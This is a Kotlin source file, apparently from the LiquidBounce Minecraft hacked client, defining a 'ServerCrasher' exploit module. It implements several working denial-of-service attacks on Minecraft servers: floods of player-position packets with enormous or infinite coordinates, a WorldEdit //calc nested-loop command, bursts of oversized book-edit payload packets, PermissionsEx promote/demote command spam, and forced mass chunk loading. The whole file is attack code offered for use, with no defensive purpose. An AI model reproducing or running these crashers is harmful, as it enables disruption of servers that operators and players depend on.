package net.ccbluex.liquidbounce.features.module.modules.exploit

import io.netty.buffer.Unpooled
import net.ccbluex.liquidbounce.event.*
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.ModuleCategory
import net.ccbluex.liquidbounce.features.module.ModuleInfo
import net.ccbluex.liquidbounce.utils.misc.RandomUtils
import net.ccbluex.liquidbounce.utils.timer.MSTimer
import net.ccbluex.liquidbounce.value.ListValue
import net.minecraft.init.Items
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.C03PacketPlayer.C04PacketPlayerPosition
import net.minecraft.network.play.client.C17PacketCustomPayload
import java.util.*

/**
 * LiquidBounce Hacked Client
 * A minecraft forge injection client using Mixin
 *
 * @game Minecraft
 * @author CCBlueX
 */
@ModuleInfo(name = "ServerCrasher", description = "Allows you to crash certain server.", category = ModuleCategory.EXPLOIT)
class ServerCrasher : Module() {
    private val modeValue = ListValue("Mode", arrayOf("AACNew", "AACOther", "AACOld", "WorldEdit", "Pex", "BookFlood", "CubeCraft", "MassiveChunkLoading"), "AACNew")
    private val pexTimer = MSTimer()

    override fun onEnable() {
        if (mc.thePlayer == null)
            return

        when (modeValue.get().toLowerCase()) {
            "aacnew" -> {
                var index = 0
                while (index < 9999) {
                    mc.netHandler.addToSendQueue(C04PacketPlayerPosition(mc.thePlayer.posX + 9412 * index, mc.thePlayer.entityBoundingBox.minY + 9412 * index, mc.thePlayer.posZ + 9412 * index, true))
                    ++index
                }
            }
            "aacother" -> {
                var index = 0
                while (index < 9999) {
                    mc.netHandler.addToSendQueue(C04PacketPlayerPosition(mc.thePlayer.posX + 500000 * index, mc.thePlayer.entityBoundingBox.minY + 500000 * index, mc.thePlayer.posZ + 500000 * index, true))
                    ++index
                }
            }
            "aacold" -> mc.netHandler.addToSendQueue(C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true))
            "worldedit" -> mc.thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}")
            "cubecraft" -> mc.thePlayer.setPosition(mc.thePlayer.posX, mc.thePlayer.posY + 0.3, mc.thePlayer.posZ)
            "massivechunkloading" -> {
                var yPos = mc.thePlayer.posY
                while (yPos < 255) {
                    mc.netHandler.addToSendQueue(C04PacketPlayerPosition(mc.thePlayer.posX, yPos, mc.thePlayer.posZ, true))
                    yPos += 5.0
                }
                var i = 0
                while (i < 1337 * 5) {
                    mc.netHandler.addToSendQueue(C04PacketPlayerPosition(mc.thePlayer.posX + i, 255.0, mc.thePlayer.posZ + i, true))
                    i += 5
                }
            }
        }
    }

    @EventTarget
    fun onMotion(event: MotionEvent) {
        if (event.eventState === EventState.POST) return
        when (modeValue.get().toLowerCase()) {
            "bookflood" -> {
                val bookStack = ItemStack(Items.writable_book)
                val bookCompound = NBTTagCompound()

                bookCompound.setString("author", RandomUtils.randomNumber(20))
                bookCompound.setString("title", RandomUtils.randomNumber(20))

                val pageList = NBTTagList()
                val pageText = RandomUtils.randomNumber(600)
                var page = 0

                while (page < 50) {
                    pageList.appendTag(NBTTagString(pageText))
                    page++
                }

                bookCompound.setTag("pages", pageList)
                bookStack.tagCompound = bookCompound

                var packets = 0

                while (packets < 100) {
                    val packetBuffer = PacketBuffer(Unpooled.buffer())
                    packetBuffer.writeItemStackToBuffer(bookStack)
                    mc.netHandler.addToSendQueue(C17PacketCustomPayload(if (Random().nextBoolean()) "MC|BSign" else "MC|BEdit", packetBuffer))
                    packets++
                }
            }
            "cubecraft" -> {
                val x = mc.thePlayer.posX
                val y = mc.thePlayer.posY
                val z = mc.thePlayer.posZ

                var i = 0

                while (i < 3000) {
                    mc.netHandler.addToSendQueue(C04PacketPlayerPosition(x, y + 0.09999999999999, z, false))
                    mc.netHandler.addToSendQueue(C04PacketPlayerPosition(x, y, z, true))
                    ++i
                }
                mc.thePlayer.motionY = 0.0
            }
            "pex" -> if (pexTimer.hasTimePassed(2000)) {
                mc.thePlayer.sendChatMessage(if (Random().nextBoolean()) "/pex promote a a" else "/pex demote a a")
                pexTimer.reset()
            }
            else -> state = false
        }
    }

    @EventTarget
    fun onWorld(event: WorldEvent) {
        if (event.worldClient == null) state = false
    }

    @EventTarget
    fun onTick(event: TickEvent?) {
        if (mc.thePlayer == null || mc.theWorld == null) state = false
    }

    override val tag: String
        get() = modeValue.get()
}